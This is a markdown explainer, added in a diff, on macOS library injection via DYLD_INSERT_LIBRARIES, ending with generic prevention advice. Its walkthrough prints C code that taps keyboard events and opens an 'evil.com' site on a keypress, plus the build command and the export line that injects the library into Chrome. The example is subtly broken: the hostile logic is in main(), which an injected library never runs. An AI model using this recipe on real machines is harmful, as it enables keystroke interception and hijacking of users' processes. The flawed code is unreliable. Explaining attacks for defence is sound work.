@@ -1,0 +1,161 @@
+# macOS Library Injection
+
+
+# 👉 Overview
+
+---
+
+### 👀 What ?
+
+> macOS Library Injection is a technique used by malicious programs to inject arbitrary code into the memory space of another process. This technique allows the injected code to be executed within the context of the target process, enabling the attacker to bypass system security measures and gain unauthorized access or control over the process.
+> 
+
+### 🧐 Why ?
+
+> Understanding macOS Library Injection is crucial because it is a common technique used in cyber-attacks to exploit vulnerabilities in software. It can lead to serious security breaches, allowing attackers to steal sensitive information, manipulate systems, or even gain complete control over a system. Therefore, knowing how this technique works can help in developing appropriate security measures and strategies to prevent such attacks.
+> 
+
+### ⛏️ How ?
+
+> To take advantage of macOS Library Injection, follow these steps: 1. Identify a target process to inject code into. This could be a running application or system process. 2. Write the code you want to inject. This code will be executed within the context of the target process. 3. Use a technique such as dynamic linking or runtime patching to inject your code into the target process. 4. Once the code is injected, it can be executed within the context of the target process, allowing you to manipulate the process or gain access to its resources.
+> 
+
+### ⏳ When ?
+
+> The technique of library injection has been in use for many years and is not specific to macOS. However, with the increasing popularity of macOS systems, attackers have started to use this technique more frequently on these systems. Therefore, it's crucial for macOS users to understand this technique to protect their systems effectively.
+> 
+
+# ⚙️ Technical Explanations
+
+---
+
+## Overview of MacOS Library Injection
+
+MacOS Library Injection is a sophisticated technique used by attackers to infiltrate and manipulate target systems. By leveraging the dynamic linker/loader, attackers can inject arbitrary code into a running process. This injected code becomes part of the process's normal execution, often remaining undetected and allowing the attacker to execute various malicious activities.
+
+## How MacOS Library Injection Works
+
+### 1. Dynamic Linker/Loader (dyld)
+
+The dynamic linker/loader, dyld, is responsible for loading shared libraries needed by a program at runtime. It resolves symbols and links libraries dynamically, providing the necessary functions and resources for the program to execute.
+
+### 2. Environment Variables
+
+The `DYLD_INSERT_LIBRARIES` environment variable can be used to specify additional dynamic libraries that dyld should load before any other libraries. This feature can be exploited by attackers to inject malicious libraries into legitimate processes.
+
+### 3. Privilege Escalation
+
+Attackers often use library injection in combination with privilege escalation techniques to gain unauthorized access to system resources. This can significantly amplify the potential damage, allowing attackers to steal data, install backdoors, or take control of the system.
+
+## Example of MacOS Library Injection
+
+Here is a detailed example demonstrating how MacOS Library Injection can be performed:
+
+### Step 1: Identify a Target Process
+
+The attacker targets a commonly used application, such as Google Chrome.
+
+### Step 2: Write Malicious Code
+
+The attacker writes malicious code to be injected. This code might perform actions like logging keystrokes or opening a malicious website.
+
+```c
+#include <stdio.h>
+#include <ApplicationServices/ApplicationServices.h>
+
+// Callback function for keyboard events
+CGEventRef myCGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
+    if ((type != kCGEventKeyDown) && (type != kCGEventKeyUp))
+        return event;
+
+    CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
+
+    // Open a malicious website when 'A' is pressed
+    if (keyCode == (CGKeyCode)0) {
+        system("open <http://www.evil.com>");
+    }
+
+    return event;
+}
+
+int main(void) {
+    CFMachPortRef eventTap;
+    CGEventMask eventMask;
+    CFRunLoopSourceRef runLoopSource;
+
+    // Create an event tap to intercept key presses
+    eventMask = ((1 << kCGEventKeyDown) | (1 << kCGEventKeyUp));
+    eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, myCGEventCallback, NULL);
+
+    if (!eventTap) {
+        exit(1);
+    }
+
+    // Create a run loop source and add it to the current run loop
+    runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
+    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
+    CGEventTapEnable(eventTap, true);
+    CFRunLoopRun();
+
+    exit(0);
+}
+
+```
+
+### Step 3: Compile the Malicious Library
+
+The attacker compiles the C code into a dynamic library (dylib).
+
+```bash
+gcc -dynamiclib -o malicious.dylib malicious.c
+
+```
+
+### Step 4: Set the DYLD_INSERT_LIBRARIES Environment Variable
+
+The attacker sets the `DYLD_INSERT_LIBRARIES` environment variable to point to the compiled malicious library.
+
+```bash
+export DYLD_INSERT_LIBRARIES=/path/to/malicious.dylib
+/Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome
+
+```
+
+### Step 5: Execution of Malicious Code
+
+When Google Chrome is launched, dyld loads the malicious library first. The injected code runs with the same privileges as the Chrome process, performing actions such as opening a malicious website whenever the 'A' key is pressed.
+
+## Preventive Measures
+
+### 1. Secure Coding Practices
+
+- **Input Validation:** Ensure all user inputs are properly validated to prevent code injection.
+- **Use Secure Functions:** Prefer secure functions that limit the potential for exploitation.
+
+### 2. System Configuration
+
+- **Environment Variable Filtering:** Implement filtering to prevent the setting of dangerous environment variables.
+- **Restrict Permissions:** Limit the ability of non-privileged users to set environment variables or modify critical system files.
+
+### 3. Monitoring and Auditing
+
+- **Regular Audits:** Conduct regular system audits to detect unauthorized changes to environment variables or system configurations.
+- **Activity Monitoring:** Use security tools to monitor system activity and detect suspicious behavior indicative of library injection.
+
+### 4. Regular Updates and Patches
+
+- **Keep Software Updated:** Regularly update the operating system and applications to include security patches.
+- **Apply Security Patches:** Promptly apply patches to mitigate known vulnerabilities that attackers might exploit.
+
+### 5. User Awareness
+
+- **Educate Users:** Train users to recognize and avoid potential security threats.
+- **Software Verification:** Encourage the use of software from trusted sources and verify the authenticity of applications before installation.
+
+## Conclusion
+
+MacOS Library Injection is a potent technique for attackers to infiltrate systems and execute malicious code. By understanding how this technique works and implementing robust security practices, it is possible to mitigate the risks associated with such attacks. Regular system updates, monitoring, and user education are essential components of a comprehensive security strategy to protect against library injection and other sophisticated cyber threats.
+
+# 🖇️ Références
+
+---
